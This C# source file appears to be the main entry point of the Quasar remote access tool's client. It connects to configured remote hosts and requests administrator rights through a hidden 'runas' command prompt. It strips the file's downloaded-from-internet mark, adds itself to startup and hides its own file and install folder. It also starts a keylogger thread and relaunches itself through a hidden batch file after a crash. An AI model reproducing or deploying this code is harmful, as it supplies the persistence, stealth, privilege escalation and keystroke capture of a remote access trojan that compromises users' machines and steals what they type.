﻿using Quasar.Client.Commands;
using Quasar.Client.Config;
using Quasar.Client.Data;
using Quasar.Client.Helper;
using Quasar.Client.Installation;
using Quasar.Client.IO;
using Quasar.Client.Networking;
using Quasar.Client.Utilities;
using Quasar.Common.Helpers;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client
{
    internal static class Program
    {
        public static QuasarClient ConnectClient;
        private static ApplicationContext _msgLoop;

        [STAThread]
        private static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            AppDomain.CurrentDomain.UnhandledException += HandleUnhandledException;

            if (Settings.Initialize())
            {
                if (Initialize())
                {
                    if (!QuasarClient.Exiting)
                        ConnectClient.Connect();
                }
            }

            Cleanup();
            Exit();
        }

        private static void Exit()
        {
            // Don't wait for other threads
            if (_msgLoop != null || Application.MessageLoop)
                Application.Exit();
            else
                Environment.Exit(0);
        }

        private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            if (!e.IsTerminating)
                return;

            string batchFile = BatchFile.CreateRestartBatch(ClientData.CurrentPath);
            if (string.IsNullOrEmpty(batchFile)) return;

            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                FileName = batchFile
            };
            Process.Start(startInfo);
            Exit();
        }

        private static void Cleanup()
        {
            CommandHandler.CloseShell();
            if (CommandHandler.StreamCodec != null)
                CommandHandler.StreamCodec.Dispose();
            if (Keylogger.Instance != null)
                Keylogger.Instance.Dispose();
            if (_msgLoop != null)
            {
                _msgLoop.ExitThread();
                _msgLoop.Dispose();
                _msgLoop = null;
            }
            MutexHelper.CloseMutex();
        }

        private static bool Initialize()
        {
            var hosts = new HostsManager(HostHelper.GetHostsList(Settings.HOSTS));

            // process with same mutex is already running
            if (!MutexHelper.CreateMutex(Settings.MUTEX) || hosts.IsEmpty || string.IsNullOrEmpty(Settings.VERSION)) // no hosts to connect
                return false;

            ClientData.InstallPath = Path.Combine(Settings.DIRECTORY, ((!string.IsNullOrEmpty(Settings.SUBDIRECTORY)) ? Settings.SUBDIRECTORY + @"\" : "") + Settings.INSTALLNAME);
            GeoLocationHelper.Initialize();

            // Request elevation
            if (Settings.REQUESTELEVATIONONEXECUTION && WindowsAccountHelper.GetAccountType() != "Admin")
            {
                ProcessStartInfo processStartInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Verb = "runas",
                    Arguments = "/k START \"\" \"" + ClientData.CurrentPath + "\" & EXIT",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };

                MutexHelper.CloseMutex();  // close the mutex so our new process will run
                bool success = true;
                try
                {
                    Process.Start(processStartInfo);
                }
                catch
                {
                    success = false;
                    MutexHelper.CreateMutex(Settings.MUTEX);  // re-grab the mutex
                }

                if (success)
                    ConnectClient.Exit();
            }

            FileHelper.DeleteZoneIdentifier(ClientData.CurrentPath);

            if (!Settings.INSTALL || ClientData.CurrentPath == ClientData.InstallPath)
            {
                WindowsAccountHelper.StartUserIdleCheckThread();

                if (Settings.STARTUP)
                {
                    if (!Startup.AddToStartup())
                        ClientData.AddToStartupFailed = true;
                }

                if (Settings.INSTALL && Settings.HIDEFILE)
                {
                    try
                    {
                        File.SetAttributes(ClientData.CurrentPath, FileAttributes.Hidden);
                    }
                    catch (Exception)
                    {
                    }
                }
                if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY && !string.IsNullOrEmpty(Settings.SUBDIRECTORY))
                {
                    try
                    {
                        DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(ClientData.InstallPath));
                        di.Attributes |= FileAttributes.Hidden;

                    }
                    catch (Exception)
                    {
                    }
                }
                if (Settings.ENABLELOGGER)
                {
                    new Thread(() =>
                    {
                        _msgLoop = new ApplicationContext();
                        Keylogger logger = new Keylogger(15000);
                        Application.Run(_msgLoop);
                    }) {IsBackground = true}.Start();
                }

                ConnectClient = new QuasarClient(hosts, Settings.SERVERCERTIFICATE);
                return true;
            }

            MutexHelper.CloseMutex();
            ClientInstaller.Install(ConnectClient);
            return false;
        }
    }
}